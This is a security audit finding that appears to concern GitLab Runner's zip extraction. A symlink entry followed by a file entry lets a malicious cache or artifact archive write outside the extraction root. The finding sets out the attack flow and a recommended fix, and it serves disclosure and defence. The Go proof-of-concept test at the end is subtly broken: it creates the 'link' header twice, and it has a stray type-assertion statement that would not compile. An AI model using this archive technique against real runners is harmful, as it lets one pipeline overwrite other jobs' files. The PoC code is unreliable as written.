### Title
Unrestricted symlink target + no path containment check in zip extraction allows cross-directory writes via chained symlink/file entries - (File: helpers/archives/zip_extract.go)

### Summary
`extractZipSymlinkEntry` creates a symlink from attacker-controlled zip content (`os.Symlink(string(data), file.Name)`) with no validation that the symlink target stays inside the extraction root. Combined with `extractZipFile`'s use of `os.MkdirAll(filepath.Dir(file.Name), ...)` and `extractZipFileEntry`'s `os.OpenFile(file.Name, ...)` on raw zip entry names, a subsequent file entry whose path traverses through that symlinked directory will write through the attacker-controlled symlink to an arbitrary filesystem location outside the intended extraction directory.

### Finding Description
`extractZipFile` (helpers/archives/zip_extract.go:61-83) dispatches based on `file.Mode() & os.ModeType`. For `os.ModeSymlink` entries, `extractZipSymlinkEntry` (lines 22-39) reads the entry's file content as the symlink target string and calls `os.Symlink(string(data), file.Name)` directly — there is no check that the resulting symlink's target is contained within the extraction root (no `filepath.Clean`, no rejection of absolute paths, no `..` checks on either `file.Name` or the target `data`). For regular files, `extractZipFileEntry` (lines 41-59) calls `os.OpenFile(file.Name, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, ...)` directly on the raw zip-provided name, and `extractZipFile` first runs `os.MkdirAll(filepath.Dir(file.Name), 0o777)` to ensure parent directories exist.

The only path-safety check present in the whole flow is `errorIfGitDirectory` in `ExtractZipArchive` (lines 88-96), which only rejects `.git` as the first path component — it provides no general path-traversal or symlink-target validation. There is no logic anywhere in this file, or in `path_check_helper.go`, that verifies a file's resolved (symlink-followed) path remains within the extraction root before writing.

Exploit flow: an attacker crafts a zip with entry order:
1. `link` — mode `ModeSymlink`, content `/tmp/target-outside` (or any absolute path such as another job's workspace).
2. `link/pwned.txt` — a regular file entry.

During extraction, `extractZipFile` processes entry 1 via `extractZipSymlinkEntry`, creating a symlink at `<root>/link` pointing to `/tmp/target-outside`. When entry 2 is processed, `os.MkdirAll(filepath.Dir("link/pwned.txt"), 0o777)` resolves through the `link` symlink (Go's `os.MkdirAll`/`os.OpenFile` follow symlinks for intermediate path components), and `extractZipFileEntry` then opens `link/pwned.txt` for write, which the OS resolves to `/tmp/target-outside/pwned.txt` — writing outside the extraction root entirely.

### Impact Explanation
This allows arbitrary-path file write (and, by symmetry with read-oriented reuse of the same primitive, exposure of file reads) reachable through any Runner-processed zip archive — this includes GitLab Runner's own cache and artifact restore paths, which call `ExtractZipFile`/`ExtractZipArchive`. Because caches/artifacts are attacker-controlled content uploaded by a pipeline author, a malicious pipeline can plant files outside its own build/cache root, potentially clobbering files used by other jobs sharing the same filesystem/host (e.g., shell executor with shared cache root, or shared temp/cache mount paths), violating the "file operations must stay within intended build/cache/artifact roots" invariant.

### Likelihood Explanation
The attack requires only the ability to control the content of a zip archive that Runner extracts (a cache or artifact archive uploaded by a normal, unprivileged pipeline), and ordering entries within a single zip file, both of which are entirely within a pipeline author's control with no additional privilege. It is fully repeatable and deterministic — no race conditions or timing dependencies are needed, since zip entries are processed sequentially in the order they appear in the central directory.

### Recommendation
Before creating a symlink in `extractZipSymlinkEntry`, and before writing any file in `extractZipFileEntry`, validate that the fully resolved target path (using `filepath.EvalSymlinks` or manual resolution) is contained within the extraction root. Reject symlink targets that are absolute or that resolve (after joining with the symlink's directory) outside the root via `..`. Additionally, before processing any entry, canonicalize `file.Name` (reject absolute paths and `..` traversal, analogous to standard zip-slip mitigations) independent of the `.git`-specific check that exists today.

### Proof of Concept
```go
// helpers/archives/zip_extract_test.go (new test)
func TestExtractZipSymlinkEscape(t *testing.T) {
    outsideDir, err := os.MkdirTemp("", "target-outside")
    require.NoError(t, err)
    defer os.RemoveAll(outsideDir)

    testInWorkDir(t, func(t *testing.T, fileName string) {
        f, err := os.Create(fileName)
        require.NoError(t, err)

        archive := zip.NewWriter(f)
        symlinkEntry, err := archive.CreateHeader(&zip.FileHeader{Name: "link"})
        require.NoError(t, err)
        symlinkEntry.(interface{ SetMode(os.FileMode) })
        // set mode to symlink, write target as content
        hdr := &zip.FileHeader{Name: "link"}
        hdr.SetMode(os.ModeSymlink | 0o777)
        w, err := archive.CreateHeader(hdr)
        require.NoError(t, err)
        _, err = w.Write([]byte(outsideDir))
        require.NoError(t, err)

        fileEntry, err := archive.Create("link/pwned.txt")
        require.NoError(t, err)
        _, err = fileEntry.Write([]byte("pwned"))
        require.NoError(t, err)

        require.NoError(t, archive.Close())
        f.Close()

        err = ExtractZipFile(fileName)
        require.NoError(t, err)

        _, err = os.Stat(filepath.Join(outsideDir, "pwned.txt"))
        assert.True(t, os.IsNotExist(err), "expected file to NOT exist outside extraction root")
    })
}
```
Expected (buggy) result: the assertion fails because `pwned.txt` is created inside `outsideDir`, proving the write escaped the extraction root through the attacker-controlled symlink.